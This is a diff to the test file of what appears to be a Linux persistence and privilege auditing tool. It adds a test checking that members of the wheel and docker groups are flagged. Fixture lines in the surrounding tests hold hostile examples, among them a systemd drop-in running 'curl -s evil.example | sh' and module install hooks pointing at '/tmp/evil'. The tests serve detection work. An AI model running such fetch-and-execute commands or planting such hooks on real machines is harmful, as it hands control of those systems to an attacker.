@@ -62,6 +62,16 @@ def test_dropins():
                     '~/.config/systemd/user/service.d/z.conf adds to every service: ExecStartPost=curl -s evil.example | sh'], rows
 
 
+def test_root_groups():
+    import arche.persistence as p
+    real = p.sh
+    p.sh = lambda *a, **k: {'docker': 'docker:x:970:finn\n', 'disk': 'disk:x:6:\n', 'wheel': 'wheel:x:10:finn,amy\n'}.get(a[-1], '') if a[:2] == ('getent', 'group') else ''
+    try: rows = [(t, s) for t, s, _ in p.remote() if 'group' in t or 'Admin' in t]
+    finally: p.sh = real
+    assert rows == [('Admin (wheel): finn', 0), ('Admin (wheel): amy', 0),
+                    ('finn is in the docker group: any program finn runs can make itself root, with no password', 1)], rows
+
+
 def test_install_cmds():
     t = ('install usb-storage /bin/true\ninstall cramfs /bin/false\ninstall dccp exit 1\n# install x /tmp/evil\n'
          'install snd-pcm /sbin/modprobe --ignore-install snd-pcm && /sbin/modprobe snd-seq\n'
@@ -98,4 +108,4 @@ def test_dns_rows():
 
 
 if __name__ == '__main__':
-    test_hooks(); test_dns_rows(); test_git_runs(); test_repo_git_folder(); test_custom_chromium_dirs(); test_unpacked_extensions(); test_dropins(); test_install_cmds(); print('ok')
+    test_hooks(); test_dns_rows(); test_git_runs(); test_repo_git_folder(); test_custom_chromium_dirs(); test_unpacked_extensions(); test_dropins(); test_root_groups(); test_install_cmds(); print('ok')
